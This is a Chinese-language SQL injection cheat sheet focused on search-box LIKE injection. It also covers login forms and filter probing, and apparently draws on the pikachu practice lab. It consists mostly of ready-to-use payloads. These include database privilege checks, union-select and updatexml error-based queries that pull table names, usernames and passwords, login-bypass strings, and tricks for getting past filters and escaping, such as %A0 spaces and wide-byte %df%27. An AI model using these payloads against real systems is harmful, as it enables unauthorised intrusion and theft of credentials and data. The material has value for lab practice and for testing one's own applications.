# 综合之-搜索型注入指北

## 一、搜索型注入简介与原理

- 1）简介
一些网站为了方便用户查找网站的资源,都对用户提供了搜索的功能,因为是搜索功能,往往是程序员在编写代码时都忽略了对其变量(参数)的过滤,而且这样的漏洞在国内的系统中普遍的存在:

其中又分为POST/GET,GET型的一般是用在网站上的搜索,而POST则用在用户名的登录,可以从form表单的method="get"属性来区分是get还是post。搜索型注入又称为文本框注入。

- 2）$sql="select * from user where password like '%$pwd%' order by password";

这句SQL的语句就是基于用户输入的pwd在users表中找到相应的password，正常用户当然会输入例如admin,ckse等等。但是如果有人输入这样的内容呢？

'and 1=1 and '%'='
这样的话这句SQL语句就变成了这样

select * from user where password like '%fendo'and 1=1 and '%'='%' order by password
changle

## 一.判断权限

a%' and (select is_member('dbo'))=1--    返回正常则 sa-系统管理员--跟windows的帐户没有关系--可以说SA的权限在SQL中是至高无上的。
a%' and (select is_member('db_owner'))=1--   返回正常则 DB
都不是那就只有一种可能啦，public，权限貌似很小。
也可以用另一种命令来判断权限
a%' and 1=(Select IS_SRVROLEMEMBER('sysadmin'));-- sa
a%' and 1=(Select IS_MEMBER('db_owner'));-- DB

## 二、搜索型注入判断
```
'and 1=1 and '%'='
%' and 1=1--'
%' and 1=1 and '%'='
```

## 三、搜索型注入实战

### 1）ge型注入
先查看源代码；
有没有字段过滤；
判断--用户名的数字
%' union select 1,2,3,4,...... and '%'='
如果不报错则为4位数。，5，6，7等等。
and exists (select id from user where LENGTH(username)<6 and id=1) and '%'=' 


### 2）判断 ---字符数量；
输入 ' order by 4#% ,报错
输入 ' order by 3#% ,未报错，通过这个简单的办法找到主查询一共有三个字段。

构造 payload: a' union select database(),user(),version()#%
利用%%闭合来写一段创建并查询数据库表，用户名和email的代码；
select username,id,email from member where username like '%$name%'";
name变成==a' union select database(),user(),4#%
就变成了select username,id,email from member where username like '%$a' union select database(),user(),4#%%'";
`#`后面被注释了。


### 3）---获取表名
a'（赋值） union select（联合查询） table_schema,table_name,2 from information_schema.tables where table_schema='pikachu'#（数据库名）
会返回一堆数据库中的表


查询表 users  和password中的数据名称：
a'union select username（表名） ,password（表明）,4 from users#%


> select下的报错演示

select（查询）/insert（插入语句）/update（数据更新）/delete（删除） 都可以使用报错来获取信息.

```

UPDATEXML(xml_document,XPathstring,new_value)
```

Updatexml() 函数作用:改变(查找并替换)XML文档中符合条件的节点的值.

第一个参数:fiedname是String格式,为表中的字段名.
第二个参数:XPathstring(Xpath格式的字符串).
第三个参数:new_value,String格式,替换查找到的符合条件的 X
改变 XML_document 中符合 XPATH_string 的值

而我们的注入语句为：
```sql
 a' and updatexml(1,concat(0x7e,(SELECT @@version)),0)#
```


其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出 ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'



获取数据库表名，输入：a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='password')),0)# ，
但是反馈回的错误表示只能显示一行，所以采用 limit 来一行一行显示

字段名 a' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0)# 更改limit后面的数字，爆表名



数据 a' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#




# **综合之-登录界面的sql语句集合**

**基于错误的POST型单引号字符型注入**

username-  a
passowrd-  a'or '1'='1 #

**基于错误的双引号POST型字符型变形的注入**

username-  a
passowrd-  a')or 1=1
passowrd-  a')or '1'='1



**POST单引号变形双注入**

username-  a
passowrd-  a')or ('1')=('1



# **综合之-测试被过滤或敏感词汇**

**字符**：
```
确认过滤了#

?id=%231
确认过滤了or

?id=or1

确认过滤多行注释符
?id=/*1

确认过滤了单行注释
?id=1'--%20
?id=1'#


确认过滤了斜杠

?id=/1
确认过滤了反斜杠

?id=1\
确认过滤了空格，报错注入才行哦，这个判断

?id=1%20
?id=1' ' '
```



**词汇**(union和select的)：
```
?id=1' union
?id=1' seletct
```

## **URL编码转义**

### 绕过空格：
`%A0 `
在URL编码中为：空值，空格。
是html中的不间断空格字符或&nbsp;


## **单引号被转义**
在每个单引号前面加"/"是php自带的转义的一种。
使用宽字节注入，应该可以绕过，常使用的是`%df%27`,mysql会认为会是一个宽字节，类似于 `x'`就可以进行绕过注入。


